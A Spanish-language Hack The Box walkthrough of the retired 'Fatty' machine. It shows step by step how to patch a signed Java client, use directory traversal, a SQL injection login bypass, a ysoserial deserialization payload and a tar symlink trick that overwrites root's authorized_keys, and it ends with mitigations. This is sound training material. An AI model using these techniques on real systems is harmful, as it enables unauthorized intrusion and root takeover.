---
machine: Fatty
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, java, jar, sqli, deserialization, ysoserial, symlink, scp, privesc]
---

# Fatty — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El FTP entrega `fatty-client.jar`, un cliente Java pesado que no conecta porque el servidor escucha en otro puerto y el JAR está firmado. Hay que desempaquetarlo, cambiar el puerto en `beans.xml`, actualizar el digest y quitar la firma para que arranque. Con el cliente ya funcional, un directory traversal descarga `fatty-server.jar`; al parchearlo se habilitan menús de administrador y se salta la comprobación de acceso. Una SQLi en el login permite entrar como admin, y una función que recibe objetos serializados se explota con `ysoserial` para obtener shell como `qtc` en el contenedor. `pspy` revela un `scp` periódico de `logs.tar` desde el contenedor al host; un symlink dentro de un tar permite reemplazar `logs.tar` y, en dos copias sucesivas, escribir la `authorized_keys` de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p21,22,1337,1338,1339 <IP>
```

- `21` vsftpd.
- `22` OpenSSH 7.4p1 Debian 10+deb9u7.
- `1337`, `1338` y `1339` hablan TLS con protocolos no identificados: son los puertos del cliente y del servidor Java.

```bash
ftp <IP>
# usuario anonymous, sin contraseña
get fatty-client.jar
```

El FTP acepta acceso anónimo y entrega el cliente.

## Enumeración

El cliente necesita una versión concreta de Java (el proyecto usa JavaFX). Al ejecutarlo intenta conectarse a `server.fatty.htb` en un puerto que no es el real:

```bash
unzip fatty-client.jar -d client
grep -rn "server.fatty.htb" client/
cat client/beans.xml
```

`beans.xml` contiene la IP y el puerto del servidor. Se corrige el puerto, se actualiza el digest y se elimina la firma para que el JAR modificado se ejecute:

```bash
rm client/META-INF/*.SF client/META-INF/*.RSA client/META-INF/*.DSA
zip -r fatty-client-patched.jar .
java -jar fatty-client-patched.jar
```

El cliente permite registrarse como `guest` y navegar por un menú limitado.

## Foothold

La función de descarga del cliente no valida la ruta. Con un traversal se obtiene el servidor:

```text
../../fatty-server.jar
```

Se repite el proceso de desempaquetado y parcheo, esta vez para habilitar los menús de administrador y saltar la comprobación de acceso del servidor. Con el cliente parcheado, el login admite una inyección en el usuario:

```text
' OR 1=1-- -
```

y se entra como administrador. Uno de los menús nuevos envía objetos Java serializados; se genera un payload con `ysoserial` y se entrega al servidor:

```bash
java -jar ysoserial.jar CommonsCollections6 '<COMANDO>' > payload.bin
```

La deserialización se ejecuta en el contenedor y devuelve una shell como `qtc`.

## Movimiento lateral

`qtc` está dentro de un contenedor; no hay otro host accesible por red. La enumeración se centra en los procesos y en los montajes compartidos con el host, que es donde está la vía de root.

## Escalada de privilegios

`pspy` muestra cada minuto una conexión SSH y un `scp` que copia `/opt/fatty/tar/logs.tar` fuera del contenedor:

```text
sshd: qtc [priv]
scp -f /opt/fatty/tar/logs.tar
```

El host copia el archivo, lo descomprime y, en una segunda pasada, vuelve a copiar el `logs.tar`. Se prepara un archivo con un symlink llamado `logs.tar` que apunta a `/root/.ssh/authorized_keys` y se coloca en `/opt/fatty/tar/logs.tar`. En la primera copia, el host descomprime el tar y el nombre `logs.tar` queda como symlink a la clave; en la segunda, el `scp` sigue el enlace y escribe el contenido que se le envía desde el contenedor. Basta con poner la clave pública propia y esperar el ciclo:

```bash
ln -s /root/.ssh/authorized_keys logs.tar
tar -cf temp.tar logs.tar
cp temp.tar /opt/fatty/tar/logs.tar
# tras la primera copia, reemplazar por la clave pública
echo "<CLAVE_PUBLICA>" > /opt/fatty/tar/logs.tar
ssh -i id_rsa root@fatty.htb
```

## Evidencia

- `fatty-client.jar` descargado por FTP anónimo.
- `beans.xml` con el puerto corregido y el JAR sin firma.
- `fatty-server.jar` obtenido por traversal y parcheado.
- Login como admin con SQLi.
- Payload de `ysoserial` y shell como `qtc`.
- `pspy` con el `scp` de `logs.tar`.
- Symlink y clave pública en `authorized_keys`; acceso como root.

## Lecciones aprendidas

- Un cliente Java firmado se puede parchear si se elimina la firma y se ajusta el digest.
- El directory traversal en una función de descarga puede entregar el binario del servidor.
- La deserialización Java es ejecución remota cuando se aceptan objetos del cliente.
- Un proceso que copia y descomprime archivos de otro contenedor confía en el contenido.
- Un symlink dentro de un tar rompe la suposición de que el archivo copiado es un archivo.

## Mitigaciones y detección

- No aceptar objetos serializados de usuarios; usar formatos de datos sin lógica (JSON) y listas de clases permitidas.
- Validar rutas de descarga contra un directorio base y rechazar `..`.
- No ejecutar servicios Java con clases de `commons-collections` accesibles si no son necesarias.
- Copiar archivos entre hosts con usuarios sin privilegios y verificar el contenido antes de descomprimir.
- Evitar `tar` sobre directorios escribibles por otros usuarios; usar `--no-same-owner` y comprobar symlinks.
- Alertar de `scp` periódicos desde contenedores y de escrituras en `authorized_keys`.

## Referencias

- [0xdf — Fatty](https://0xdf.gitlab.io/2020/08/08/htb-fatty.html)
- [IppSec — Fatty](https://www.youtube.com/watch?v=3bvKLj0akMM)
- [Hack The Box — Fatty](https://app.hackthebox.com/machines/fatty)
